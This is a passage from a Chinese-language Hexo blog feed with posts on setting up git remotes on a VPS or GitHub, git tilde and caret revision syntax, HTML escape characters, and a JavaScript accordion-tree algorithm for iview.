<p><a href="https://segmentfault.com/a/1190000007748862">(Git)合并多个 commit</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/34197548">GIT 使用 rebase 和 merge 的正确姿势</a></p>
<p><a href="https://segmentfault.com/a/1190000030688343">学会 git-rebase 看这一篇就可以了</a></p>
<p><a href="http://jartto.wang/2018/12/11/git-rebase/">彻底搞懂 Git-Rebase</a></p>
</blockquote>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>rebase</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用git配合github或VPS做代码仓库</title>
    <url>/2018/02/21/git%E5%BB%BA%E7%AB%8B%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[<p>虽然git做为版本控制工具，最大的特点是分布式多人协作，但是对个人开发者来说git除了用来版本控制，还可以当作中心版本库，用来在各个设备间同步代码，省去了用U盘和云盘管理代码的麻烦。</p>
<span id="more"></span>
<h2 id="在VPS上建立代码仓库"><a href="#在VPS上建立代码仓库" class="headerlink" title="在VPS上建立代码仓库"></a>在VPS上建立代码仓库</h2><ol>
<li><p>在VPS上建立新文件夹，并初始化为裸版本库。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> init --bare<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 注：VPS上的版本库只用来做为同步的中心版本库， 并不用于开发，故建立为裸版本库。</p>
</li>
<li><p>在本地PC上的开发版本库目录中，添加远程版本库。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> remote <span class="token function">add</span> remoteNickname ssh://username@ipAddress<span class="token punctuation">(</span>domainName<span class="token punctuation">)</span>:port/fileAddress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>将本地PC上的开发版本库的分支推送至远程中心版本库</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push origin master <span class="token comment">#将master分支推送至origin</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p>例:<br>在远程VPS上</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /root/foo <span class="token comment">#在VPS上建立foo文件夹</span>
<span class="token builtin class-name">cd</span> /root/foo <span class="token comment">#以foo为当前工作目录</span>
<span class="token function">git</span> init --bare <span class="token comment">#在foo中建立裸版本库</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在本地PC上</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> c:/foo <span class="token comment">#假设在开发版本库在本地c盘的foo中，以foo为前工作目录</span>

<span class="token function">git</span> remote <span class="token function">add</span> origin ssh://root@192.169.1.1:28888/root/foo
<span class="token comment">#远程目录别名一般为origin，用root账户登录ssh，192.169.1.1为你VPS的IP地址，28888为你的ssh端口，/root/foo则是第1步中裸版本库的文件地址</span>

<span class="token function">git</span> push origin master <span class="token comment">#将master分支推送至origin</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="在github上建立代码仓库"><a href="#在github上建立代码仓库" class="headerlink" title="在github上建立代码仓库"></a>在github上建立代码仓库</h2><ol>
<li>在github网站上建立新的仓库，获取仓库的github链接，可以是https链接也可以是ssh的git链接，两种链接处理方式不同。</li>
<li>在本地添加远程版本库。<br>如使用https协议，则会提示输入github账户密码；<br>如使用git协议（ssh），则应在本地PC的bash中运行ssh-keygen -t rsa后，将用户目录下的隐藏文件夹.ssh中的id_rsa.pub的文件内容复制到github设置中的ssh key管理页面。<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#https协议</span>
<span class="token function">git</span> remote <span class="token function">add</span> remoteNickname https://github/yourUsername/yourRepository.git

<span class="token comment">#git（ssh）协议</span>
ssh-keygen -t rsa <span class="token comment">#生成ssh公钥</span>
<span class="token comment">#将ssh公钥在github设置好后</span>
<span class="token function">git</span> remote <span class="token function">add</span> remoteNickname git@github/yourUsername/yourRepository.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li>将本地版本库的一个分支推送至github。<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push remoteNickname master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
注意：向远程版本库推送时如果报错，可以尝试先拉取远程版本库的更新再进行推送。<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull remoteNickname master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
如果在创建github仓库时勾选了自动创建md文档，则第一次pull会失败，因为本地仓库与github仓库不是同一个base，在拉取时应使用–allow-unrelated-histories参数<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull remoteNickname master --allow-unrelated-histories<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>远程仓库</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo小技巧</title>
    <url>/2018/04/10/hexo%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h3 id="hexo与markdown特殊字符"><a href="#hexo与markdown特殊字符" class="headerlink" title="hexo与markdown特殊字符"></a>hexo与markdown特殊字符</h3><ul>
<li><p>要在文章中表示hexo与markdown占用的特殊字符时，可以使用<a href="/2018/04/10/html%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/" title="html特殊字符">html特殊字符</a>的转义字符。</p>
</li>
<li><p>若要在文章中直接输出转义字符串时，则可以用代码块标签&#96;&#96;&#96; &#96;&#96;&#96;包裹转义字符串。</p>
</li>
</ul>
<p>在markdown表格中使用“|”时，由于竖线在markdown中是表格的特殊字符，故要在markdown表格中输出竖线时，应使用html特殊字符的转义字符串。即<code>&amp;#124;</code></p>
<p>在hexo中标签插件占用了&#123;&#37; &#37;&#125;，要在文章中输出花括号与百分号时，使用html特殊字符的转义字符。</p>
<h3 id="引用文章"><a href="#引用文章" class="headerlink" title="引用文章"></a>引用文章</h3><p>hexo引用站内的其他文章时，使用标签插件。</p>
<p>&#123;&#37; post_link slug &#37;&#125; 用来生成文章链接，点击可直接跳转到链接的文章</p>
<p>&#123;&#37; post_path slug &#37;&#125; 用来生成文章的路径</p>
<p>slug 指文章标题，它是markdown文件名称，而不是front-matter中的title字段。</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>特殊字符</tag>
        <tag>转义</tag>
        <tag>引用站内文章</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>git波浪号与脱字符的区别</title>
    <url>/2021/07/14/git%E6%B3%A2%E6%B5%AA%E5%8F%B7%E4%B8%8E%E8%84%B1%E5%AD%97%E7%AC%A6%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p>在 git 中我们常常会见到波浪号 <code>~</code> 与脱字符（或者叫插入符）<code>^</code> 两个符号，例如 <code>get reset --hard HEAD~2</code> 或 <code>git reset --hard HEAD^2</code>，那么这两个符号有什么区别呢？</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><ul>
<li><p>波浪号 <code>~</code> 是指第几代祖先提交;</p>
</li>
<li><p>脱字符 <code>^</code> 是指第几个父提交;</p>
</li>
<li><p>这两个符号可以混合使用;</p>
</li>
</ul>
<span id="more"></span>

<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">G   H   I   J
 \ /     \ /
  D   E   F
   \  |  / \
    \ | /   |
     \|/    |
      B     C
       \   /
        \ /
         A

A =      = A^0
B = A^   = A^1     = A~1
C = A^2
D = A^^  = A^1^1   = A~2
E = B^2  = A^^2
F = B^3  = A^^3
G = A^^^ = A^1^1^1 = A~3
H = D^2  = B^^2    = A^^^2  = A~2^2
I = F^   = B^3^    = A^^3^
J = F^2  = B^3^2   = A^^3^2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><h3 id="波浪号（-）"><a href="#波浪号（-）" class="headerlink" title="波浪号（~）"></a>波浪号（~）</h3><p><code>&lt;rev&gt;~&lt;n&gt;</code>指 rev 提交的第 n 代祖先提交。</p>
<ul>
<li><p><code>A~0</code> 第 0 代祖先提交，即 A 本身;</p>
</li>
<li><p><code>A~</code> 与 <code>A~1</code> 等价，指第一代祖先，即父提交;</p>
</li>
<li><p>当同一祖先层级有多个提交时，<code>~</code> 都指向当前层级左起第一个提交，例如<code>A~</code>是指 B 而不是 C，<code>A~2</code>指 D 而不是 E 或 F;</p>
</li>
<li><p><code>A~~~</code> 与 <code>A~3</code> 表示相同的意义，即 A 的第三代祖先提交;</p>
</li>
</ul>
<h3 id="脱字符，也叫插入符（-）"><a href="#脱字符，也叫插入符（-）" class="headerlink" title="脱字符，也叫插入符（^）"></a>脱字符，也叫插入符（^）</h3><p><code>&lt;rev&gt;~&lt;n&gt;</code>指 rev 提交的第 n 个父提交。</p>
<ul>
<li><p><code>A^0</code> 第 0 个父提交，即 A 本身;</p>
</li>
<li><p><code>A^</code> 与 <code>A^1</code> 等价 同时也与 <code>A~</code>、<code>A~1</code>等价，指第一个父提交;</p>
</li>
<li><p><code>^</code> 对父提交的指向也是从左算起，如<code>A^</code>指 B，<code>A^2</code>指 C;</p>
</li>
<li><p><code>A^^^</code> 与 <code>A^3</code> 含义不同，<code>A^^^</code> 相当于 <code>A^1^1^1</code> 的缩写，指 A 的父的父的父，与 <code>A~3</code> 相同，即指 G。而 <code>A^3</code> 则指 A 的第 3 个父提交，A 只有两个父提交 B、C，故不存在;</p>
</li>
</ul>
<blockquote>
<p>参考资料</p>
<p><a href="https://scarletsky.github.io/2016/12/29/tilde-and-caret-in-git/">Git 中的 ~ 和 ^</a></p>
<p><a href="https://www.cnblogs.com/mengff/p/12809911.html">git 中 HEAD^和 HEAD~区别</a></p>
<p><a href="https://www.codenong.com/2221658/">Git 中的 HEAD ^和 HEAD?有什么区别？</a></p>
<p><a href="https://git-scm.com/docs/git-rev-parse">git-rev-parse</a></p>
</blockquote>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>^</tag>
        <tag>脱字符（插入符）</tag>
        <tag>波浪号</tag>
      </tags>
  </entry>
  <entry>
    <title>html特殊字符</title>
    <url>/2018/04/10/html%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<h1 id="html-特殊字符"><a href="#html-特殊字符" class="headerlink" title="html 特殊字符"></a>html 特殊字符</h1><h2 id="转义字符串的由来"><a href="#转义字符串的由来" class="headerlink" title="转义字符串的由来"></a>转义字符串的由来</h2><p>HTML 中&lt;，&gt;，&amp;等有特殊含义（&lt;，&gt;，用于链接签，&amp;用于转义），不能直接使用。这些符号是不显示在我们最终看到的网页里的，倘若我们需要在页面中显示这些字符，就需要用到转义字符串了。</p>
<h2 id="转义字符串的组成"><a href="#转义字符串的组成" class="headerlink" title="转义字符串的组成"></a>转义字符串的组成</h2><p>一个完整的转义字符串，分为三个部分：</p>
<ul>
<li>一个&amp;符号(英文为 ampersand)；</li>
<li>实体名字或#号加上实体编号；</li>
<li>一个;号；<br>  例如，常用的大于号&gt;，使用转义字符串后的写法为<code>&amp;gt;</code>或<code>&amp;#62;</code>。</li>
</ul>
<p>我们注意到，上面的大于号使用了 2 种方式的转义，第一种称为实体名称，第二种为实体编号，区别在于实体名称的优点为便于记忆，但兼容性不完美，实体编号则反之。</p>
<h2 id="html、css、js-特殊字符"><a href="#html、css、js-特殊字符" class="headerlink" title="html、css、js 特殊字符"></a>html、css、js 特殊字符</h2><p>html 本身存在很多的特殊字符，像我们常见的 Copyright 符号 ©，使用特殊字符需要注意以下几点：</p>
<ul>
<li>这些字符属于 unicode 字符集，你的文档需要声明为 utf-8;</li>
<li>这些字符在 html、css、js 中的书写方式各有不同，例如向左的箭头 ⇠，如下：<ul>
<li>HTML： <code>&amp;#8672;</code></li>
<li>CSS： \21E0, css 的写法需要加上反斜杠，常用在 content 属性中</li>
<li>JS： \u21E0，js 的写法需在 css 的基础上前面加个 u</li>
</ul>
</li>
<li>字符在各浏览器的表现略有区别，使用需谨慎。</li>
</ul>
<blockquote>
<p>引自 <a href="https://007sair.github.io/2016/07/04/UNICODE/">https://007sair.github.io/2016/07/04/UNICODE/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>特殊字符</tag>
        <tag>转义</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>html的span标签无法设置宽与高</title>
    <url>/2018/12/06/html%E7%9A%84span%E6%A0%87%E7%AD%BE%E6%97%A0%E6%B3%95%E8%AE%BE%E7%BD%AE%E5%AE%BD%E4%B8%8E%E9%AB%98/</url>
    <content><![CDATA[<h1 id="span标签无法设置宽和高"><a href="#span标签无法设置宽和高" class="headerlink" title="span标签无法设置宽和高"></a>span标签无法设置宽和高</h1><p>为什么在给span标签设置了宽和高后无法生效？因为span标签是内联元素，没有固定的格式表现，在浏览器标准中span标签的width与height属性会被忽略，故无法设置宽和高。</p>
<p>我们可以给span标签设置display属性为inline-block，使span标签成为行内块级元素，这样就可以改变span标签的宽和高了。</p>
]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>span</tag>
      </tags>
  </entry>
  <entry>
    <title>iview手风琴树算法</title>
    <url>/2019/02/06/iview%E6%89%8B%E9%A3%8E%E7%90%B4%E6%A0%91%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="iview-手风琴树算法"><a href="#iview-手风琴树算法" class="headerlink" title="iview 手风琴树算法"></a>iview 手风琴树算法</h1><p>设置外部变量 lastNode 保存上次节点（若 lastNode 为 null 则什么都不做）以判断父子关系</p>
<p>依据父子关系：</p>
<p>若点击自身或子树，不操作。<br>若点击父树，则折叠所有子树。<br>若点击父树的兄弟树，则折叠与兄弟树同级的所有其他父树</p>
<p>如果 lastNode 和 currentNode 在同一树分支中，父树的 nodeKey 一定比子树小，遍历 nodeKey 小的树，来确定 lastNode 和 currentNode 是父子树关系，还是兄弟树关系</p>
<p>若确定 currentNode 是 lastNode 的兄弟树。则查找 currentNode 与 lastNode 的公共父树。（由于 accordion 模式，若是兄弟树关系则 currentNode 一定是 lastNode 父树的兄弟树，因此 currentNode 的父树也是 lastNode 的父树，是双方的公共父树）</p>
<p>用到的函数：查找兄弟树父树、折叠除当前节点外，当前节点父树下所有的结点、判断树关系、递归查找是否为子节点</p>
<span id="more"></span>

<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/*
 * 传入当前点击的树节点与整个树的数据
 * 修改树的数据以实现手风琴树
 */</span>
<span class="token keyword">let</span> lastNode <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">toggleMenuTreeOrigin</span><span class="token punctuation">(</span><span class="token parameter">currentNode<span class="token punctuation">,</span> treeData</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">/*
   * 根据节点nodeKey的大小传入两个节点
   * 判断第二个节点是否为第一个节点的子节点
   */</span>
  <span class="token keyword">function</span> <span class="token function">isChild</span><span class="token punctuation">(</span><span class="token parameter">parent<span class="token punctuation">,</span> child</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 遍历判断第二个节点的nodeKey是否与第一个节点的子节点相同，若相同则返回true，否则判断第一个节点的子节点是否还有子节点，若无则返回false，若有则递归判断。</span>
    <span class="token keyword">return</span> parent<span class="token punctuation">.</span>children<span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span>
      item<span class="token punctuation">.</span>nodeKey <span class="token operator">===</span> child<span class="token punctuation">.</span>nodeKey
        <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>children <span class="token operator">?</span> <span class="token function">isChild</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> child<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">/*
   * 传入当前点击节点与上次点击节点
   * 判断当前点击节点与上次点击节点是相同节点、父节点、子节点还是兄弟节点关系
   */</span>
  <span class="token keyword">function</span> <span class="token function">treeRelationship</span><span class="token punctuation">(</span><span class="token parameter">currentNode<span class="token punctuation">,</span> lastNode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 若当前节点nodeKey与上次点击节点nodeKey相同，则返回"same"，若当前节点nodeKey大于上次节点nodeKey，根据iview生成nodeKey的规律，当前节点只可能是上次节点的子节点或兄弟节点，若当前节点nodeKey小于上次节点nodeKey，则当前节点只可能是上次节点的父节点或兄弟节点，使用isChild方法判断是否父子节点，根据判断结果返回"parent"、"child"、"brother"</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>currentNode<span class="token punctuation">.</span>nodeKey <span class="token operator">===</span> lastNode<span class="token punctuation">.</span>nodeKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">"same"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>currentNode<span class="token punctuation">.</span>nodeKey <span class="token operator">></span> lastNode<span class="token punctuation">.</span>nodeKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token function">isChild</span><span class="token punctuation">(</span>lastNode<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"child"</span> <span class="token operator">:</span> <span class="token string">"brother"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token function">isChild</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">,</span> lastNode<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"parent"</span> <span class="token operator">:</span> <span class="token string">"brother"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">/*
   * 传入树数据和当前节点
   * 返回当前节点的父节点
   */</span>
  <span class="token keyword">function</span> <span class="token function">findParent</span><span class="token punctuation">(</span><span class="token parameter">treeData<span class="token punctuation">,</span> currentNode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 最终父节点</span>
    <span class="token keyword">let</span> finalParentNode <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token comment">/*
     * 传入树数据，当前点击节点、与此时遍历节点的父节点
     * 将最终父节点赋值为当前点击节点的父节点
     */</span>
    <span class="token keyword">function</span> <span class="token function">findParentInner</span><span class="token punctuation">(</span><span class="token parameter">treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">,</span> parentNode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 内部查找函数，若当前节点nodeKey与遍历节点nodeKey相同时，则此时的parentNode为要找的最终父节点，否则判断遍历节点是否存在子节点，若存在则递归执行函数，若不存在则什么都不做</span>
      treeData<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span>
        item<span class="token punctuation">.</span>nodeKey <span class="token operator">===</span> currentNode<span class="token punctuation">.</span>nodeKey
          <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              finalParentNode <span class="token operator">=</span> parentNode<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
          <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              item<span class="token punctuation">.</span>children
                <span class="token operator">?</span> <span class="token function">findParentInner</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>children<span class="token punctuation">,</span> currentNode<span class="token punctuation">,</span> item<span class="token punctuation">)</span>
                <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 执行内部函数</span>
    <span class="token function">findParentInner</span><span class="token punctuation">(</span>treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">,</span> finalParentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> finalParentNode<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">/*
   * 传入树数据，当前点击节点
   * 折叠树
   */</span>
  <span class="token keyword">function</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span><span class="token parameter">treeData<span class="token punctuation">,</span> currentNode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    treeData<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 若遍历节点为折叠则什么都不做，若为展开则判断遍历节点与当前节点nodeKey是否相同，若相同则什么都不做，否则设为折叠</span>
      item<span class="token punctuation">.</span>expand
        <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            item<span class="token punctuation">.</span>nodeKey <span class="token operator">===</span> currentNode<span class="token punctuation">.</span>nodeKey <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">:</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>expand <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// 若遍历节点存在子节点则递归此函数，否则什么都不做</span>
      item<span class="token punctuation">.</span>children <span class="token operator">?</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>children<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">// 若上次点击节点为空则什么都不做，否则判断当前点击节点与上次点击节点关系，若为相同或子节点，则什么都不做；若为父节点，则折叠当前节点所有子节点；若为兄弟节点，则找到当前节点父节点，若父节点为空则说明点击了根节点，折叠整个树，否则折叠父节点的所有子节点</span>
  lastNode <span class="token operator">===</span> <span class="token keyword">null</span>
    <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> parentNode<span class="token punctuation">;</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">treeRelationship</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">,</span> lastNode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">case</span> <span class="token string">"same"</span><span class="token operator">:</span>
          <span class="token keyword">case</span> <span class="token string">"child"</span><span class="token operator">:</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
          <span class="token keyword">case</span> <span class="token string">"parent"</span><span class="token operator">:</span>
            <span class="token function">collapseTree</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">.</span>children<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
          <span class="token keyword">case</span> <span class="token string">"brother"</span><span class="token operator">:</span>
            parentNode <span class="token operator">=</span> <span class="token function">findParent</span><span class="token punctuation">(</span>treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
            parentNode <span class="token operator">===</span> <span class="token keyword">null</span>
              <span class="token operator">?</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span>treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span>
              <span class="token operator">:</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span>parentNode<span class="token punctuation">.</span>children<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 将上次点击节点赋值为本次点击节点</span>
  lastNode <span class="token operator">=</span> currentNode<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前方高能预警</p>
<hr>
<p>以上全是Bullshit，算法冗余太多。</p>
<h1 id="最终精简算法"><a href="#最终精简算法" class="headerlink" title="最终精简算法"></a>最终精简算法</h1><p>无需判断父子关系，直接找到当前点击节点 currentNode 的父节点 parrentNode，折叠除当前节点 currentNode 外，父节点 parentNode 下所有子节点。</p>
<p>用到的函数：查找父结点，折叠除父节点外所有子节点</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/*
 * iview手风琴树（每次只展开一个树节点）
 * 传入当前节点与树数据（类型Array）
 */</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">accordionTree</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">currentNode<span class="token punctuation">,</span> treeData</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token comment">/*
   * 传入树数据和当前节点
   * 返回当前节点的父节点
   */</span>
  <span class="token keyword">function</span> <span class="token function">findParent</span><span class="token punctuation">(</span><span class="token parameter">treeData<span class="token punctuation">,</span> currentNode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 声明最终父节点</span>
    <span class="token keyword">let</span> finalParentNode <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token comment">/*
     * 传入树数据，当前点击节点、与此时遍历节点的父节点
     * 将最终父节点赋值为当前点击节点的父节点
     */</span>
    <span class="token keyword">function</span> <span class="token function">findParentInner</span><span class="token punctuation">(</span><span class="token parameter">treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">,</span> parentNode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 内部查找函数，若当前节点nodeKey与遍历节点nodeKey相同时，则此时的parentNode为要找的最终父节点，否则判断遍历节点是否存在子节点，若存在则递归执行函数，若不存在则什么都不做</span>
